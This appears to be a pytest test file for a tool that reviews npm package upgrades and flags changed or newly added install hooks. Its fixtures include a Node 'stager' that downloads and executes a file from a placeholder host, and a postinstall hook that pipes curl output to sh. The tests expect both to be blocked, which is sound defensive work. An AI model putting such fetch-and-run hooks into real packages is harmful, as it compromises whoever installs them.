from __future__ import annotations

import pytest
from tests.test_upgrade_review import _kinds, _one, registry

__all__ = ["registry"]

GYP = '{"targets": [{"target_name": "binding", "sources": ["src/binding.cc"]}]}\n'
BENIGN = "console.log('ready');\n"
PREBUILD = (
    "const fs = require('fs');\nconst path = require('path');\n"
    "if (!fs.existsSync(path.join(__dirname, '..', 'prebuilds'))) process.exit(1);\n"
)
STAGER = (
    "const https = require('https');\nconst fs = require('fs');\n"
    "const { execFileSync } = require('child_process');\n"
    "https.get('https://h.invalid/tool', (r) => {\n"
    "  r.pipe(fs.createWriteStream('/tmp/tool')).on('finish', () => execFileSync('/tmp/tool'));\n"
    "});\n"
)


def _hooks(registry, name, old, new):
    registry.npm(name, "1.0.0", old[1], manifest={"scripts": old[0]})
    registry.npm(name, "1.0.1", new[1], manifest={"scripts": new[0]})
    return _one("npm", name, "1.0.0", "1.0.1")[0]


@pytest.mark.parametrize(
    ("old", "new"),
    [
        (
            ({"install": "node-pre-gyp install --fallback-to-build"}, {"binding.gyp": GYP}),
            ({"install": "node-gyp-build"}, {"binding.gyp": GYP}),
        ),
        (
            (
                {"postinstall": "node -e \"try{require('./_postinstall')}catch(e){}\""},
                {"_postinstall.js": BENIGN},
            ),
            (
                {"postinstall": "node -e \"try{require('./_postinstall')}catch(e){}\" || exit 0"},
                {"_postinstall.js": BENIGN},
            ),
        ),
        (
            ({"install": "node-gyp rebuild"}, {"binding.gyp": GYP}),
            (
                {"install": "node scripts/prebuild.js || node-gyp rebuild"},
                {"binding.gyp": GYP, "scripts/prebuild.js": PREBUILD},
            ),
        ),
    ],
)
def test_changed_command_of_an_existing_install_hook_warns(registry, old, new):
    result = _hooks(registry, "hooked", old, new)

    assert result["block"] == []
    assert "install_script_changed" in _kinds(result, "warn")


def test_existing_hook_whose_command_adds_a_download_pipe_blocks(registry):
    result = _hooks(
        registry,
        "piped",
        ({"postinstall": "node install.js"}, {"install.js": BENIGN}),
        (
            {"postinstall": "node install.js && curl -s https://h.invalid/x | sh"},
            {"install.js": BENIGN},
        ),
    )

    assert "new_install_hook" in _kinds(result, "block")


def test_existing_hook_that_newly_runs_a_stager_script_blocks(registry):
    result = _hooks(
        registry,
        "staged",
        ({"postinstall": "node install.js"}, {"install.js": BENIGN}),
        ({"postinstall": "node setup.js"}, {"install.js": BENIGN, "setup.js": STAGER}),
    )

    assert "new_install_hook" in _kinds(result, "block")


def test_new_install_hook_event_still_blocks_and_is_not_also_a_change(registry):
    result = _hooks(
        registry,
        "added",
        ({"install": "node-gyp rebuild"}, {"binding.gyp": GYP}),
        (
            {"install": "node-gyp rebuild", "postinstall": "node done.js"},
            {
                "binding.gyp": GYP,
                "done.js": BENIGN,
            },
        ),
    )

    assert _kinds(result, "block") == ["new_install_hook"]
    assert result["block"][0]["snippet"] == "node done.js"
    assert not [delta for delta in result["warn"] if "command changed" in delta["detail"]]
